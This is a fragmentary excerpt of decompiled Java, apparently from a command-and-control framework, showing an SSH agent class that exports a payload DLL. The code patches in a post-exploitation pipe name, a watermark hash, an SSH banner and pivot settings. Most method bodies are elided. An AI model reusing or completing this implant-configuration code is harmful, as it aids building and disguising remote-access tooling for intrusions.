...
public class SSHAgent {
   ...
   public SSHAgent(BeaconSetup var1, Profile var2, String var3, int var4, String var5, String var6, String var7, boolean var8) {
      ...
      this.setup = var1;
      this.c2profile = var2;
      this.statusp = var2.getPostExPipeName(this.getDefaultStatusPipeName());
   }

   protected String getDefaultStatusPipeName() {
   ...
   public byte[] export(String var1) {
      ...
      var2 = CommonUtils.patch(var2, "\\\\.\\pipe\\" + this.getDefaultStatusPipeName(), this.getStatusPipeName());
   ...
   protected byte[] exportSSHDLL(String var1) {
      ...
      var4.addString(36, this.c2profile.getString(".watermarkHash"), 32);
      if (this.pubkey) {
      ...
      var4.addString(56, "SSH-2.0-" + this.c2profile.getString(".ssh_banner"), 128);
      BeaconPayload.setupPivotFrames(this.c2profile, var4);
